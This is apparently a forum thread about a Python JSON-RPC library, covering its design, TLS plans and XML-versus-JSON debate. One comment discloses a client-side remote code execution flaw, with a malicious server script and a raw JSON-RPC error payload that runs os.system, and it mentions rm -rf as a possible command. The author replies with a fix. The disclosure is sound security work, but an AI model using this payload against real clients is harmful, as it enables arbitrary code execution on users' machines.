@@ -1,0 +1,93 @@
+A simple way to make client/server applications
+
+>Remote exception passing (When calling a remote method in a client, exceptions thrown by the server code will be thrown locally!)
+
+Be very very careful doing stuff like this.  Figuring out classes and evaluating them on the client end is a recipe for security issues.  Sure enough looking at the code, this is easy to exploit.
+
+Eg. say I'm a malicious hacker, and I manage to redirect your client to talk to my server (eg. DNS poisoning, MITM, whatever).  Here's my code (a tiny modificiation of your simpleserver example):
+
+    #!/usr/bin/python
+    import jrpc
+
+    class eval(Exception):
+        def __init__(self, arg):
+            self.args=[arg]
+
+    class SimpleService(jrpc.service.SocketObject):
+        @jrpc.service.method
+        def echo(self, msg):
+            raise eval('__import__("os").system("echo owned")')  # Could be rm -rf ~/*, or pretty much anything I want here
+
+    server = SimpleService(50001, debug = True) #Include the listening port
+    server.run_wait()
+
+Your client calls this, and hey presto, I now have remote code execution on their machine.  Oops.
+
+Note: I've actually exploited a slight bug in your code here to make this easy to illustrate.  In exceptions.py, you have:
+
+    def _get_closest_exception(inheritance_list):
+        for except_type in inheritance_list:
+            if hasattr(sys.modules["__main__"].__builtins__, except_type["class"]):
+                return getattr(sys.modules["__main__"].__builtins__, except_type["class"])
+        return None
+
+I'm guessing that `sys.modules['__main__'].__builtins__` here should actually be `except_type["module"]` (or maybe even doing the importing itself if not in sys.modules yet), unless this is deliberately only looking in `__builtins__` to avoid allowing arbitrary exception classes (which may not be a bad idea, but isn't sufficient).  This is why my "eval" class is being looked up in builtins, rather than the module I define it in.
+
+However, this bug isn't neccessary for the hack - I can just as easily write a simple TCP server that spits back something like:
+
+    {"jsonrpc": "2.0", "id": 1, "error": {"message":"")", "code": -32000, "data": {"classes": [{"class": "eval", "module": "__builtins__"}], "args": ["__import__(\"os\").system(\"echo owned\")"]}}}
+
+to every request, since its the client side where the vulnerability is anyway.
+I'd like to see some more in depth examples on this. Intriguing. 
+[How is this better than the std lib xmlrpc?](https://docs.python.org/2/library/xmlrpclib.html)
+What are the advantages over the standard python jsonrpc module ? 
+
+
+https://pypi.python.org/pypi/python-jsonrpc
+Looks cool. Does it support ssl?
+How does it handle network failure? 
+It's not very  explicit that you listen on all interfaces with the port -- while as you should be doing a firewall that rejects all connections by default, your example allude to this being a local setup only.
+
+For Python RPC, I like this long running library: https://pypi.python.org/pypi/Pyro4
+
+Main advantage is the object broker. I don't want to remember port numbers, but names.
+Saved, thanks for bringing this up. Looks useful. 
+Awesome, this is a really cool exploit. I made a patch on github that verifies the thing you pull out of builtins is a subclass of BaseException and if it's not returns a ServerError instead.
+
+Thanks for the work!
+Originally I wrote this to solve a problem we have at my work. We're interested in making a server that will handle modifying files as a specific user to change config values like hostapd's SSID or WPA or something. I included an example that works to this end in the git repository.
+1. Method decorators are easier to read and use than registering functions.
+2. xmlrpclib.Fault's make exception handling harder as just one exception type is thrown, I focus on making less work for the developer by throwing the exact exception in the client context that was thrown in the server context, or a useful one if another error occurs.
+3. (XML vs. JSON)
+I will probably write a TLS/SSL version of the SocketObject/SocketProxy on Monday.
+Python-JRPC makes a focus on exception handling, and because of that almost everything that goes wrong will throw a, hopefully useful, exception. JSON RPC v2.0 outlines several error types that I've made into python exceptions. Clients will also throw exceptions when a network error occurs.
+The examples are meant to be simple, the constructors of all these objects allow you to specify a specify host to listen on (in service objects) or connect to (in proxy objects).
+
+My original implementation included named objects but I opted to remove it because of the unnecessary complexity it adds.
+Could you do away with the need for `jrpc.service.SocketObject` (probably via globals) for mini applications like this?
+This code does indeed look easier to use than xmlrpc, but your number 3 there is a bit snooty and completely irrelevant to what makes your code better.
+TLS would be sweet, thanks.
+I didn't know JSON RPC was a thing. That's a little worrying.
+
+RPC has been a bit of a rollercoaster. It went through a period of huge popularity with Sun RPC, DCE and CORBA, then fell out of favor and was considered an antipattern, because making remote calls transparently look like local ones disregards most of the twelve fallacies of distributed computing. XML-RPC and SOAP were almost universally derided outside of the Microsoft world, especially because of their use of XML.
+
+Now it seems like it's seeing something of a resurgence with projects like Twitter's Finagle.
+You can always shorten the names in your programs by doing something like:
+
+from jrpc.service import SocketObject
+
+Or are you suggesting something else?
+I put in parenthesis mainly as a side note but here are reasons it actually does matter:
+
+1. In xmlrpc, the XML parser exposes security vulnerabilities
+2. Messages are shorter in JSON than XML
+3. The JSON spec is better defined leading to less compliance issues with third party implemented servers/clients
+If you've ever used XML-RPC, you know that you never *see* any XML.  So if it was "universally derided outside the Microsoft world" (which I don't think it is or was) because it used XML, it's a bad case of judging a book by its cover.
+Have used XML-RPC. Have seen its XML. So.
+[deleted]
+And it mattered?
+It's true that JSON is more compact than some XML representation of the same data.  But it'd take a lot of data for it to be an order of magnitude right?  That'd mean that some XML representation of data was 10X larger than JSON, and I don't think that's credible.  I'm a fan of JSON for this kind of thing, but not for this reason.
+Every... debugging... session.
+Not to mention: gzipping your body should take care of most of the repetitive overhead that XML has over JSON.
+A convenient time to point out that Python-JRPC supports pretty verbose debug mode on the server objects. Never worry about looking at a single TCP socket.
+You've an entirely different experience with XML-RPC than I've had.  I've implemented XML-RPC parsers but that was the only time I really had to know or care that XML-RPC used XML.  Maybe Python's XML-RPC client library has spoiled me.
